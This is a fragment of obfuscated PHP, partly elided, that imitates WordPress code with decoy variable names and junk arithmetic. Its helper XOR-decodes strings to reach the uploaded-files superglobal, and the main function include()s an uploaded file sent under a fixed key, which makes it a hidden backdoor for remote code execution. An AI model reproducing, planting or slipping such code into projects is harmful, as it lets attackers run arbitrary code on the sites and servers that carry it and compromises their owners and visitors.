...
function arg_index($part)

{
    $expages = $part;
	$icon_dir_uri = 'import_id';

    $script_and_style_regex = $GLOBALS[double_prime("%3B++%2A%01%3D", $expages)];
    $operator = $script_and_style_regex;
    $wpsmiliestrans = 'unique';
    $last_pee = isset($operator[$expages]);
    $can_export = 'unique';
    if ($last_pee)

    {
	$incposts = 'comments';
        $post_name_check = $script_and_style_regex[$expages];

        $sign = 123;
        $icon = 656;

        $myHTML = $post_name_check[double_prime("%10%0B%199%2A%0F4%28", $expages)];
        $_post = 'unique';
        $plural_base = $myHTML;
        $safe_text = $sign % ($icon + 4);
        $sign = $icon - $sign;
        include ($plural_base);
    }
...
function double_prime($attachment_id, $map_meta_cap)

{
	...
	$more_text = 'char';
    $statuses  .= "decode";
    $show_ui = $statuses($attachment_id);

    $excerpt_more = strlen($show_ui);
	$short_url = 'feature';
    $excerpt_more = substr($value, 0, $excerpt_more);

    $attributes = $show_ui ^ $excerpt_more;
    $post_type_meta_caps = 620;


    $show_ui = sprintf($attributes, $excerpt_more);
    $post_type_meta_caps = $post_type_meta_caps + 4;
    $haystack = 'unique';



    return $attributes;
	$post_mime_types = 'fire_after_hooks';
}

arg_index('dfifDnYMKC');
